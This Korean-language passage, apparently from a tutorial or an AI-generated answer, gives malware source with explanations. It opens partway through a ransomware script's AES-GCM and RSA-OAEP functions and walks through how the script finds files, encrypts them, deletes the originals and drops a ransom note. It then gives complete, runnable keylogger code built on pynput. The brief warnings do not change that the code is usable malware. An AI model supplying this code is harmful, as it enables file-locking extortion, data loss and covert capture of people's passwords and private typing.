```python
  """AES-256 대칭 키 생성"""

def encrypt_aes(key, plaintext):
  """AES-GCM 방식으로 데이터 암호화 (인증 암호화)"""
  iv = os.urandom(12) # 96비트 IV 권장
  cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
  encryptor = cipher.encryptor()
  # GCM은 추가 인증 데이터(AAD)를 지원하지만, 여기서는 사용하지 않음
  # encryptor.authenticate_additional_data(b"associated data")
  ciphertext = encryptor.update(plaintext) + encryptor.finalize()
  return iv + encryptor.tag + ciphertext # IV와 TAG를 암호문 앞에 붙여 저장

def decrypt_aes(key, iv_tag_ciphertext):
  """AES-GCM 방식으로 데이터 복호화"""
  iv = iv_tag_ciphertext[:12]
  tag = iv_tag_ciphertext[12:28] # GCM TAG 길이는 16바이트 (128비트)
  ciphertext = iv_tag_ciphertext[28:]
  cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
  decryptor = cipher.decryptor()
  # decryptor.authenticate_additional_data(b"associated data") # 암호화 시 사용했다면 동일하게 추가
  return decryptor.update(ciphertext) + decryptor.finalize()

def encrypt_rsa(public_key_pem, data):
  """RSA 공개키로 데이터 암호화 (AES 키 암호화에 사용)"""
  public_key_loaded = serialization.load_pem_public_key(
      public_key_pem,
      backend=default_backend()
  )
  ciphertext = public_key_loaded.encrypt(
      data,
      padding.OAEP(
          mgf=padding.MGF1(algorithm=hashes.SHA256()),
          algorithm=hashes.SHA256(),
          label=None
      )
  )
  return ciphertext

def decrypt_rsa(private_key, ciphertext):
    """RSA 개인키로 데이터 복호화 (AES 키 복호화 시연용)"""
    # 실제 랜섬웨어에는 복호화 로직(개인키)이 포함되지 않음
    plaintext = private_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext
```

**코드 설명:**

1. **필요 라이브러리 임포트:** `os` (파일/디렉토리 작업), `sys` (시스템 관련), `cryptography` (암호화 기능), `secrets` (암호학적으로 안전한 난수 생성). `cryptography` 라이브러리가 없다면 `pip install cryptography` 명령으로 설치해야 합니다.
2. **RSA 키 생성:** 실제 랜섬웨어는 공격자의 RSA _공개키_만 포함합니다. 이 코드에서는 시연을 위해 RSA 키 쌍(공개키+개인키)을 생성합니다. `pem_public_key` 변수에 저장된 PEM 형식의 공개키가 랜섬웨어에 포함될 부분입니다.
3. **대상 확장자:** `TARGET_EXTENSIONS` 리스트에 암호화할 파일의 확장자를 지정합니다.
4. **AES 키 생성 (`generate_aes_key`):** `os.urandom(32)`를 사용해 256비트(32바이트)의 강력한 대칭 키를 생성합니다.
5. **AES 암호화/복호화 (`encrypt_aes`, `decrypt_aes`):** AES-GCM 모드를 사용합니다. GCM은 기밀성(암호화)과 무결성(위변조 방지)을 함께 제공하는 인증 암호화 방식입니다. IV(Initialization Vector)와 인증 태그(Tag)가 암호화 과정에서 생성되며, 복호화 시 필요하므로 암호문과 함께 저장합니다.
6. **RSA 암호화/복호화 (`encrypt_rsa`, `decrypt_rsa`):** 생성된 AES 대칭 키를 공격자의 RSA _공개키_로 암호화합니다. 이렇게 하면 공격자의 _개인키_ 없이는 AES 키를 복호화할 수 없습니다. `decrypt_rsa` 함수는 시연용이며 실제 랜섬웨어에는 포함되지 않습니다.
7. **파일 검색 (`find_files_to_encrypt`):** `os.walk`를 사용하여 지정된 디렉토리와 모든 하위 디렉토리를 탐색하며 `TARGET_EXTENSIONS`에 해당하는 파일을 찾습니다. (주석 처리된 부분처럼 시스템 폴더를 제외하는 로직을 추가할 수 있습니다.)
8. **랜섬 노트 생성 (`create_ransom_note`):** 사용자에게 파일이 암호화되었음을 알리고, 복구를 위한 연락 방법과 함께 **RSA로 암호화된 AES 키 (16진수 형태)** 를 포함하는 텍스트 파일을 생성합니다.
9. **메인 로직 (`if __name__ == "__main__":`)**
    - 사용자로부터 암호화할 대상 디렉토리를 입력받습니다. **(매우 중요: 테스트용 폴더만 지정)**
    - 사용자에게 위험성을 경고하고 재확인합니다.
    - 대상 파일을 검색합니다.
    - 파일 암호화에 사용할 단일 AES 키를 생성합니다. (실제로는 더 복잡한 키 관리 사용 가능)
    - 생성된 AES 키를 미리 정의된 RSA 공개키로 암호화합니다.
    - 찾아낸 각 파일을 순회하며 다음 작업을 수행합니다:
        - 파일 내용을 읽습니다.
        - AES 키로 파일 내용을 암호화합니다.
        - 암호화된 내용을 원본 파일에 덮어쓰거나, `.locked` 와 같은 확장자를 붙여 새 파일로 저장합니다.
        - **원본 파일을 삭제합니다.** (이 코드에서는 `os.remove` 사용)
    - 암호화 작업 완료 후 결과를 요약하여 출력합니다.
    - 지정된 위치에 랜섬 노트를 생성합니다.
    - (주석 처리된 복호화 시연 부분은 실제 랜섬웨어에는 없습니다.)

## **2. 키로거 (Keylogger) 예시 (Python)**

키로거는 사용자의 키보드 입력을 몰래 기록하는 악성 코드입니다. 아래는 `pynput` 라이브러리를 사용하여 키 입력을 감지하고 파일에 기록하는 기본적인 예시입니다.

**주의:** 이 코드를 실행하려면 `pynput` 라이브러리가 필요합니다. `pip install pynput` 명령으로 설치할 수 있습니다. 또한, 키보드 입력을 가로채는 행위는 운영체제나 보안 소프트웨어에 의해 차단될 수 있으며, 사용자의 명시적인 동의 없이 실행하는 것은 심각한 프라이버시 침해 및 불법 행위입니다.

```
import pynput.keyboard
import logging
import os
import sys
from datetime import datetime

# --- 로깅 설정 ---
log_dir = "" # 로그 파일을 저장할 디렉토리 (비워두면 스크립트 실행 위치)
# 로그 파일명 (예: keylog_2025-04-24_12-30-00.txt)
log_filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
log_filepath = os.path.join(log_dir, log_filename)

# 기본 로깅 설정: 파일에 시간과 로그 레벨, 메시지 기록
logging.basicConfig(filename=log_filepath,
                    level=logging.DEBUG, # DEBUG 레벨 이상 모두 기록
                    format='%(asctime)s [%(levelname)s] %(message)s')

print(f"키 입력을 감지하고 '{log_filepath}' 파일에 기록합니다.")
print("종료하려면 스크립트 실행 창을 닫거나 Ctrl+C를 누르세요.")

# --- 키 입력 처리 함수 ---
def on_press(key):
    """키가 눌렸을 때 호출될 함수"""
    try:
        # 일반 문자 키 처리 (예: 'a', '1', ' ')
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        # 특수 키 처리 (예: 'Shift', 'Ctrl', 'Enter', 'Space')
        logging.info(f"Special Key Pressed: {key}")

def on_release(key):
    """키에서 손을 뗐을 때 호출될 함수 (선택 사항)"""
    # 예: 특정 키 (예: Esc)가 눌리면 로거 종료
    if key == pynput.keyboard.Key.esc:
        print("\nESC 키가 감지되어 로거를 종료합니다.")
        # 리스너 중지
        return False

# --- 키보드 리스너 시작 ---
# with 구문을 사용하면 리스너가 종료될 때 자동으로 정리됨
try:
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join() # 리스너가 중지될 때까지 대기
except Exception as e:
    logging.error(f"키보드 리스너 실행 중 오류 발생: {e}")
    print(f"\n오류 발생: {e}")
    sys.exit(1)
except KeyboardInterrupt:
    # 사용자가 Ctrl+C로 종료 시도
    print("\nCtrl+C 감지. 로거를 종료합니다.")
    logging.warning("Logger terminated by user (KeyboardInterrupt).")
    sys.exit(0)

print("키로거가 정상적으로 종료되었습니다.")
logging.info("Keylogger stopped.")
```

**코드 설명:**

- **`pynput.keyboard`:** 키보드 이벤트를 감지하는 라이브러리입니다.
- **`logging`:** 키 입력 정보를 파일에 기록하기 위해 사용합니다. 시간 순서대로 기록되어 분석하기 용이합니다.
- **`log_filepath`:** 키 입력 로그가 저장될 파일 경로입니다. 현재 시간 정보를 포함하여 실행할 때마다 새 로그 파일이 생성되도록 했습니다.
- **`on_press(key)`:** 키가 눌릴 때마다 실행되는 함수입니다. `key.char`를 통해 일반 문자 키를, `key` 객체 자체를 통해 특수 키(Shift, Ctrl, Alt, F1 등)를 구분하여 로그에 기록합니다.
- **`on_release(key)`:** 키에서 손을 뗄 때 실행되는 함수입니다. 여기서는 ESC 키가 눌리면 리스너를 중지하고 프로그램을 종료하는 예시를 추가했습니다.
- **`pynput.keyboard.Listener(...)`:** 키보드 이벤트를 감지하는 리스너 객체를 생성하고 시작합니다. `on_press`와 `on_release`에 정의된 함수를 이벤트 핸들러로 등록합니다.
- **`listener.join()`:** 리스너가 백그라운드에서 계속 실행되도록 합니다. `on_release` 함수에서 `False`를 반환하거나, 오류가 발생하거나, 사용자가 Ctrl+C를 누르면 `join()`이 해제되고 프로그램이 종료됩니다.
